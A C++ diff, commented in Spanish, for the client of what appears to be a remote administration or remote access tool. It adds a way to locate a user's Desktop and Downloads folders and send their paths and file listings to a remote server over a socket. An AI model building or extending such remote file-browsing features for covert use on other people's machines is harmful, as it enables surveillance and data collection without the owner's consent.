@@ -167,7 +167,27 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
 
     //Lista directorio
     if(this->Comandos[strIn[0].c_str()] == EnumComandos::FM_Dir_Folder){
-        for (auto item : vDir(strIn[1].c_str())) {
+        std::string strPath = "";
+        if (strIn[1] == "DESCAR-DOWN") {
+            strPath = this->ObtenerDown();
+            std::string strPathBCDown = std::to_string(EnumComandos::FM_CPATH);
+            strPathBCDown.append(1, '\\');
+            strPathBCDown += strPath;
+            //Enviar ruta del directorio al servidor
+            this->cSend(this->sckSocket, strPathBCDown.c_str(), strPathBCDown.size(), 0, true);
+            Sleep(10);
+        } else if (strIn[1] == "ESCRI-DESK") {
+            strPath = this->ObtenerDesk();
+            std::string strPathBCDesk = std::to_string(EnumComandos::FM_CPATH);
+            strPathBCDesk.append(1, '\\');
+            strPathBCDesk += strPath;
+            //lios mismo aqui
+            this->cSend(this->sckSocket, strPathBCDesk.c_str(), strPathBCDesk.size(), 0, true);
+            Sleep(10);
+        } else {
+            strPath = strIn[1];
+        }
+        for (auto item : vDir(strPath.c_str())) {
             std::string strCommand = std::to_string(EnumComandos::FM_Dir_Folder);
             strCommand.append(1, '\\');
             strCommand.append(item);
@@ -403,6 +423,41 @@ int Cliente::cRecv(SOCKET& pSocket, char* pBuffer, int pLen, int pFlags, bool is
             delete[] cTmpBuff;
         }
         return iRecibido;
+    }
+}
+
+//Misc
+std::string Cliente::ObtenerDesk() {
+    TCHAR szTemp[MAX_PATH];
+    if (SHGetFolderPath(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, szTemp) == S_OK) {
+        return std::string(szTemp) + "\\";
+    }
+    return std::string("-");
+}
+
+std::string Cliente::ObtenerDown() {
+    TCHAR szTemp[MAX_PATH];
+    std::string strRutaDesc = "";
+    WIN32_FIND_DATA win32Archivo_1;
+    if (GetEnvironmentVariable("USERPROFILE", (LPSTR)szTemp, sizeof(szTemp)) > 0) {
+        strRutaDesc = szTemp;
+        strRutaDesc += "\\Descargas";
+        if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
+            return strRutaDesc + "\\";
+        }
+        else {
+            strRutaDesc = szTemp;
+            strRutaDesc += "\\Downloads";
+            if (FindFirstFileA(strRutaDesc.c_str(), &win32Archivo_1) != INVALID_HANDLE_VALUE) {
+                return strRutaDesc + "\\";
+            }
+            else {
+                return std::string("N/A");
+            };
+        }
+    }
+    else {
+        return std::string("N/A");
     }
 }
 
